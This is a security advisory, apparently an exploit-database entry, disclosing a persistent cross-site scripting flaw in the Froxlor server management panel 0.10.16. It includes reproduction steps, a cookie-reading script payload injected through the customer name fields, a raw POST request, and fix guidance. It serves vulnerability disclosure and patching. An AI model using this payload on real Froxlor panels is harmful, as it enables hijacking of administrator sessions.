@@ -1,0 +1,301 @@
+# Exploit Title: Froxlor Froxlor Server Management Panel 0.10.16 - Persistent Cross-Site Scripting
+# Exploit Author: Vulnerability-Lab
+# Date: 2020-11-12
+# Vendor Homepage: https://froxlor.org/
+# Software Link: https://froxlor.org/download/
+# Version: 0.10.16
+
+Document Title:
+===============
+Froxlor v0.10.16 CP - (Customer) Persistent Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2241
+
+
+Release Date:
+=============
+2020-11-12
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2241
+
+
+Common Vulnerability Scoring System:
+====================================
+5.2
+
+
+Vulnerability Class:
+====================
+Cross Site Scripting - Persistent
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Froxlor Server Management Panel, the lightweight server management
+software for your needs. Developed by experienced server
+administrators, this open source (GPL) panel simplifies the effort of
+managing your hosting. Manage reseller ressources and
+limit what the customers may use in the dedicated customerpanel. MySQL
+management, Directory protection & settings management.
+
+(Copy of the Homepage: https://froxlor.org/index.php  &
+https://froxlor.org/download/ )
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered a persistent
+cross site vulnerability in the Froxlor Server Management Panel v0.10.16.
+
+
+Affected Product(s):
+====================
+Froxlor Team
+Product: Froxlor v0.10.16 (Stable) - Server Management Panel (Control Panel)
+Affected Packages: Gentoo, Debian & Ubuntu
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-01: Researcher Notification & Coordination (Security Researcher)
+2020-05-02: Vendor Notification (Security Department)
+2020-05-13: Vendor Response/Feedback (Security Department)
+2020-10-12: Vendor Fix/Patch (Service Developer Team)
+****-**-**: Security Acknowledgements (Security Department)
+2020-11-12: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+Authentication Type:
+====================
+Restricted Authentication (Guest Privileges)
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Full Disclosure
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the Froxlor Server Management Panel v0.10.16 web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser
+to web-application requests from the application-side.
+
+The persistent cross site web vulnerability is located in the
+`username`, `name` and `firstname` input fields of the customer
+add or registration module. Remote attackers are able to add customers
+with malicious script code as firstname or name to
+manipulate in the backend the `admin_customers.php` and `customers.php`
+files. The injection point is the registration
+or customer add/edit module and the execution occurs on preview of the
+traffic module in the admin backend. The request
+method to inject is POST and the attack vector is persistent located on
+the application-side. In a valid attack case the
+remote attacker uses a customer or reseller account to inject the
+payload as name to provoke an execute in the insecure
+backend module.
+
+Successful exploitation of the vulnerability results in session
+hijacking, persistent phishing attacks, persistent external
+redirects to malicious source and persistent manipulation of affected
+application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Input(s):
+[+] Username
+[+] Name
+[+] Firstname
+
+Vulnerable Module(s):
+[+] Customers
+
+Vulnerable Parameter(s):
+[+] name
+[+] firstname
+
+Affected File(s):
+[+] admin_customers.php
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation vulnerability can be exploited by remote
+attackers with low privilege user account and with low user interaction.
+For security demonstration or to reproduce the security web
+vulnerability follow the provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Register or login with a low privilege user account
+2. Open the profile account section
+3. Change the name and firstname or include in the registration process
+Note: Inject test payload to vulnerable marked input fields
+4. Save or submit the input via form
+5. Wait until an admin or higher privileged user role opens the traffic
+stats to execute
+6. Successful reproduce of the persistent input validation web
+vulnerability!
+
+
+PoC: Payload (Exploitation)
+test%20>"<script alert(document.cookie)></script>div style=1
+
+
+PoC: Vulnerable Sources (Execution Points) [admin_customers.php or
+customers.php to admin_traffic.php via Name & Firstname]
+<tr role="row">
+<td>>">test%20>"<script alert(document.cookie)></script>div
+style=1[MALICIOUS SCRIPT CODE EXECUTION POINT!]&nbsp;
+<a
+href="admin_customers.php?s=9e20410f4871894db51f11258d5c4b3b&target=traffic&page=customers&action=su&id=2"
+
+rel="external" target="_blank">[Details]</a></td>
+<td><small>-</small></td>
+</tr><tr role="row">
+
+
+--- PoC Session Logs [POST] --- (Reseller Account to Admin)
+https://froxlor.localhost:8080/admin_customers.php?s=e3b54c0284e4beca6fd06fed6c86ee20
+Host: froxlor.localhost:8080
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 879
+Origin: https://froxlor.localhost:8080
+Connection: keep-alive
+Referer:
+https://froxlor.localhost:8080/admin_customers.php?s=e3b54c0284e4beca6fd06fed6c86ee20&page=customers&action=add
+Cookie: PHPSESSID=c34ist63ukv1vq9vt5m1hfumpo
+s=e3b54c0284e4beca6fd06fed6c86ee20&page=customers&action=add&send=send&
+new_loginname=test1%20>"<script alert(document.cookie)></script>div
+style=1&createstdsubdomain=0,1&
+store_defaultindex=0,1&new_customer_password=KwhyqgzvPo&
+new_customer_password_suggestion=KwhyqgzvPo&sendpassword=0,1&def_language=English&api_allowed=0,1&
+name=btest%20>"<script alert(document.cookie)></script>div style=1&
+firstname=ctest%20>"<script alert(document.cookie)></script>div
+style=1&gender=0&
+company=&street=&zipcode=&city=&phone=&fax=&email=trest@aol.de&customernumber=&
+custom_notes=&custom_notes_show=0&diskspace=0&traffic=0&subdomains=0&emails=0&email_accounts=0&
+email_forwarders=0&email_imap=0,1&email_pop3=0,1&ftps=0&mysqls=0&phpenabled=0,1&allowed_phpconfigs[]=1&
+perlenabled=0&dnsenabled=0&logviewenabled=0
+-
+POST: HTTP/2.0 200 OK
+server: Apache
+vary: Accept-Encoding
+content-encoding: gzip
+content-length: 1393
+content-type: text/html; charset=UTF-8
+
+
+Reference(s):
+https://froxlor.localhost:8080/
+https://froxlor.localhost:8080/admin_traffic.php
+https://froxlor.localhost:8080/admin_traffic.php?s=[x]&page=customers
+
+
+Solution - Fix & Patch:
+=======================
+The vulnerability can be patched by follwing the next steps ...
+1. Validate and escape the content of the vulnerable username, name and
+firstname input fields
+2. Restrict the input fields and disallow specialchars on inputs to filter
+3. Parse the two output location and escape or secure encode the content
+4. Encode in the edit formular the results on check
+
+
+Security Risk:
+==============
+The security risk of the persistent validation web vulnerability in the
+web-application is estimated as medium.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
